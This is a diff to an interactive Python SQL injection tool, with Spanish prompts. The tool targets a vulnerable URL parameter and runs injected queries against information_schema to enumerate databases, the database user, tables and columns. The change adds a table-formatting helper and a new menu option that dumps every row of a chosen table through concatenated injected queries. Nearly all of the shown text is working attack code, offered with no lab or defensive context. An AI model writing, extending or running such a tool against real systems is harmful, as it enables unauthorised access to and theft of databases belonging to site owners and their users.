@@ -3,6 +3,43 @@ import argparse
 import sys
 import re
 
+
+def imprimir_tabla_sql(cabeceras, filas):
+    """
+    Imprime una tabla con formato estilo consola SQL.
+    
+    :param cabeceras: Lista de nombres de columnas
+    :param filas: Lista de listas, cada sublista es una fila de datos
+    """
+    if not cabeceras:
+        print("No hay datos para mostrar.")
+        return
+    
+    # Calcular anchos de columna (máximo entre cabecera y datos)
+    anchos = [len(str(col)) for col in cabeceras]
+    for fila in filas:
+        for i, val in enumerate(fila):
+            if i < len(anchos):
+                anchos[i] = max(anchos[i], len(str(val)))
+    
+    # Construir separador
+    separador = '+' + '+'.join(['-' * (ancho + 2) for ancho in anchos]) + '+'
+    
+    # Imprimir cabecera
+    print(separador)
+    cabecera_fmt = '|' + '|'.join([f' {str(col).ljust(anchos[i])} ' for i, col in enumerate(cabeceras)]) + '|'
+    print(cabecera_fmt)
+    print(separador)
+    
+    # Imprimir filas
+    for fila in filas:
+        fila_fmt = '|' + '|'.join([f' {str(fila[i] if i < len(fila) else "").ljust(anchos[i])} ' for i in range(len(cabeceras))]) + '|'
+        print(fila_fmt)
+    
+    print(separador)
+    print(f"{len(filas)} filas en el conjunto")
+
+
 def realizar_peticion(url, params):
     """
     Función genérica para hacer peticiones.
@@ -15,7 +52,6 @@ def realizar_peticion(url, params):
     except requests.exceptions.RequestException as e:
         print(f"\n[!] Error de conexión: {e}")
         sys.exit(1)
-
 
 
 
@@ -214,7 +250,8 @@ def menu_interactivo(url, param_vulnerable, otros_params, num_cols, col_visible,
     print("3. Obtener Usuario actual")
     print("4. Listar Tablas")
     print("5. Listar Columnas de una Tabla")
-    print("6. Salir")
+    print("6. Mostrar toda la tabla")
+    print("7. Salir")
     
     while True:
         
@@ -223,38 +260,81 @@ def menu_interactivo(url, param_vulnerable, otros_params, num_cols, col_visible,
         if opcion == '1':
             query = "SELECT group_concat(schema_name) FROM information_schema.schemata"
             res = extraer_dato(url, param_vulnerable, otros_params, num_cols, col_visible, query, tipo_inyeccion)
-            print(f"\n[+] Bases de Datos: {res}")
-            res = res.split(',')
-            if res:
-                bbdd = input("Selecciona la base de datos a usar: ")
-                if bbdd in res:
+            print(f"\n[+] Bases de Datos disponibles:")
+            if res and res != "No se pudo extraer el dato":
+                bbdds = res.split(',')
+                imprimir_tabla_sql(["Nombre"], [[db] for db in bbdds])
+                bbdd = input("\nSelecciona la base de datos a usar: ")
+                if bbdd in bbdds:
                     print(f"[+] Base de datos seleccionada: {bbdd}")
                 else:
                     print("[-] Base de datos no válida, se usará la predeterminada.")
                     bbdd = extraer_dato(url, param_vulnerable, otros_params, num_cols, col_visible, "database()", tipo_inyeccion)
+            else:
+                print("No se pudieron obtener las bases de datos.")
             
         elif opcion == '2':
             res = extraer_dato(url, param_vulnerable, otros_params, num_cols, col_visible, "database()", tipo_inyeccion)
-            print(f"\n[+] Base de Datos: {res}")
-            bbdd = res
+            print(f"\n[+] Base de Datos actual:")
+            if res and res != "No se pudo extraer el dato":
+                imprimir_tabla_sql(["Base de Datos"], [[res]])
+                bbdd = res
+            else:
+                print("No se pudo obtener la base de datos actual.")
             
         elif opcion == '3':
             res = extraer_dato(url, param_vulnerable, otros_params, num_cols, col_visible, "user()", tipo_inyeccion)
-            print(f"\n[+] Usuario: {res}")
+            print(f"\n[+] Usuario de la base de datos:")
+            if res and res != "No se pudo extraer el dato":
+                imprimir_tabla_sql(["Usuario"], [[res]])
+            else:
+                print("No se pudo obtener el usuario.")
             
         elif opcion == '4':
-            # group_concat para sacar todo en una sola petición
             query = f"SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema='{bbdd}'"
             res = extraer_dato(url, param_vulnerable, otros_params, num_cols, col_visible, query, tipo_inyeccion)
-            print(f"\n[+] Tablas: {res}")
+            print(f"\n[+] Tablas en la base de datos '{bbdd}':")
+            if res and res != "No se pudo extraer el dato":
+                tablas = res.split(',')
+                imprimir_tabla_sql(["Tabla"], [[t] for t in tablas])
+            else:
+                print("No se pudieron obtener las tablas.")
 
         elif opcion == '5':
             tabla = input("Introduce el nombre de la tabla: ")
             query = f"SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema='{bbdd}' AND table_name='{tabla}'"
             res = extraer_dato(url, param_vulnerable, otros_params, num_cols, col_visible, query, tipo_inyeccion)
-            print(f"\n[+] Columnas de {tabla}: {res}")
-            
+            print(f"\n[+] Columnas de la tabla '{tabla}':")
+            if res and res != "No se pudo extraer el dato":
+                columnas = res.split(',')
+                imprimir_tabla_sql(["Columna"], [[c] for c in columnas])
+            else:
+                print("No se pudieron obtener las columnas.")
+
         elif opcion == '6':
+            tabla = input("Introduce el nombre de la tabla: ")
+            # Primero obtener las columnas
+            query_cols = f"SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema='{bbdd}' AND table_name='{tabla}'"
+            columnas_str = extraer_dato(url, param_vulnerable, otros_params, num_cols, col_visible, query_cols, tipo_inyeccion)
+            columnas = columnas_str.split(',') if columnas_str else []
+            
+            # Imprimir todas las filas de la tabla
+            print(f"\n[+] Contenido de la tabla {tabla}:")
+            if columnas and columnas[0]:
+                cols_query = ', '.join(columnas)
+                # Usar separador especial para parsear filas y columnas
+                query = f"SELECT group_concat(concat_ws('||', {cols_query}) SEPARATOR '<<ROW>>') FROM {bbdd}.{tabla}"
+                res = extraer_dato(url, param_vulnerable, otros_params, num_cols, col_visible, query, tipo_inyeccion)
+                
+                if res and res != "No se pudo extraer el dato":
+                    filas = [fila.split('||') for fila in res.split('<<ROW>>')]
+                    imprimir_tabla_sql(columnas, filas)
+                else:
+                    print("No se pudieron obtener los datos de la tabla.")
+            else:
+                print("No se pudieron obtener las columnas de la tabla.")
+                
+        elif opcion == '7':
             print("Saliendo...")
             break
         else:
@@ -265,7 +345,8 @@ def menu_interactivo(url, param_vulnerable, otros_params, num_cols, col_visible,
             print("3. Obtener Usuario actual")
             print("4. Listar Tablas")
             print("5. Listar Columnas de una Tabla")
-            print("6. Salir")
+            print("6. Mostrar toda la tabla")
+            print("7. Salir")
     
 
 
